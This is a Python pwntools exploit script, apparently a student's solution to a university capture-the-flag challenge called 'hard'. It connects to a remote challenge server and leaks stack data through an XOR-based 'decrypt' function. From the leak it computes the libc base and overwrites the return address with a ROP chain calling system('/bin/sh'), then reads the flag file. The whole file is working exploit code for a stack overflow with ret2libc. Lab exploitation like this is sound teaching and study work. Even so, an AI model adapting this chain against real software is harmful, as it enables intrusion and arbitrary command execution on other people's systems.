#!/usr/bin/env python3
from pwn import *

#! More explanations in report.txt

# exe = ELF("./easy")
# exe = ELF("./medium")
# hard chall is dynamically linked, so here's helper
# patched version to load proper ld and libc
# exe = ELF("./hard_patched")
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-linux-x86-64.so.2")

# context.binary = exe
index_number = b"439954"

ADDR_LEN_IN_BYTES = 8  # Size of one address
POP_RDI_OFFSET = 0x28715  # Offset of the "pop rdi; ret" gadget in the libc.so.6
BIN_SH_OFFSET = 0x1C041B  # Offset of the "/bin/sh" string in the libc.so.6
SYSTEM_OFFSET = 0x55230  # Offset of the system function in the libc.so.6
NOTHING_SPECIAL_OFFSET = (
    POP_RDI_OFFSET + 1
)  # Offset of the instruction just to move stack pointer by 8 bytes in the libc.so.6
LIBC_OFFSET = 0x280D0  # Offset from the beginning of the file to the return address from main() to __libc_start_main() is constant.

# Distance (in bytes) between the beginning of the data buffer and the return address in the 'decrypt' function.
DATA_BUFFER_TO_DECRYPT_RET_DISTANCE = 72
# Distance (in bytes) between the beginning of the data buffer and the return address in the 'main' function.
DATA_BUFFER_TO_MAIN_RET_DISTANCE = 104


def conn():
    # r = process([exe.path, index_number])
    # gdb.attach(r)
    r = remote("bsk.bonus.re", 13337)
    return r


def server_welcome(r):
    r.recvuntil(b"Podaj numer indeksu\n")
    r.sendline(index_number)
    r.recvuntil(b"Select difficulty\n")
    r.recvuntil(b"1 - hard\n")
    r.recvuntil(b"2 - medium\n")
    r.recvuntil(b"3 - easy\n")
    r.sendline(b"1")  # Level hard
    r.recvuntil(b"The flag is in /tmp/flag.txt\n")
    r.recvuntil(b"Good luck!\n")


def send_data_zero(r):  # Sends data with length 1 and content b"\x00"
    r.sendlineafter(b"How long is the data?\n", b"1")
    r.sendlineafter(b"Gib data: ", b"\x00")


def send_key(r, key):
    r.sendlineafter(b"How long is the key?\n", str(len(key)).encode())
    r.sendlineafter(b"Gib key: ", key)
    r.recvuntil(b"Here's your decrypted data:\n")


def prepare_key(stack):
    ADDRESSES_TO_OVERWRITE = (
        4  # NOTHING_SPECIAL_OFFSET, POP_RDI_OFFSET, BIN_SH_OFFSET, SYSTEM_OFFSET
    )

    overwrites = [
        u64(
            stack[
                DATA_BUFFER_TO_DECRYPT_RET_DISTANCE
                + i : DATA_BUFFER_TO_DECRYPT_RET_DISTANCE
                + i
                + ADDR_LEN_IN_BYTES
            ]
        )
        for i in range(0, ADDRESSES_TO_OVERWRITE * ADDR_LEN_IN_BYTES, ADDR_LEN_IN_BYTES)
    ]

    saved_rip_of_main = u64(
        stack[
            DATA_BUFFER_TO_MAIN_RET_DISTANCE : DATA_BUFFER_TO_MAIN_RET_DISTANCE
            + ADDR_LEN_IN_BYTES
        ]
    )
    libc_base_address = saved_rip_of_main - LIBC_OFFSET

    key = b"\x00" * DATA_BUFFER_TO_DECRYPT_RET_DISTANCE
    # x^y^y = x
    key += p64((libc_base_address + NOTHING_SPECIAL_OFFSET) ^ overwrites[0])
    key += p64((libc_base_address + POP_RDI_OFFSET) ^ overwrites[1])
    key += p64((libc_base_address + BIN_SH_OFFSET) ^ overwrites[2])
    key += p64((libc_base_address + SYSTEM_OFFSET) ^ overwrites[3])
    return key


def get_flag(r):
    phrase = "bsk{"
    r.sendline(b"cat /tmp/flag.txt")
    r.recvuntil(phrase.encode())
    response = r.recvuntil(b"}").decode()
    print("Found flag: ", phrase + response)


def main():
    r = conn()
    server_welcome(r)
    send_data_zero(r)

    # First we want to know what's on the stack
    key_zero = b"\x00" * (DATA_BUFFER_TO_MAIN_RET_DISTANCE + ADDR_LEN_IN_BYTES)
    send_key(r, key_zero)

    # Then we prepare the key which will XOR with current stack and run system("/bin/sh")
    stack = r.recvn(len(key_zero))
    key = prepare_key(stack)

    send_data_zero(r)
    send_key(r, key)
    r.recvn(len(key))

    get_flag(r)  # Prints flag on the screen
    r.interactive()  # Or simply use command: cat /tmp/flag.txt


if __name__ == "__main__":
    main()
